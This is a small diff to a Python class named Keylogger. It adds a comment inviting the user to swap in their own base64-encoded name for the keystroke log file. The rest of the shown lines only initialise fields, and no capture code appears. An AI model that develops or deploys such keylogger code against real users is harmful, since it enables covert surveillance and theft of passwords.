@@ -17,7 +17,7 @@ class Keylogger:
         Args:
             output_dir for the path of the file
         """
-        encoded_name = b'a2V5X2xvZy50eHQ='
+        encoded_name = b'a2V5X2xvZy50eHQ=' # Replace with your own base 64 encoded name for the keylogger txt file
         self.keys = []
         self.count = 0
         self.output_dir = output_dir
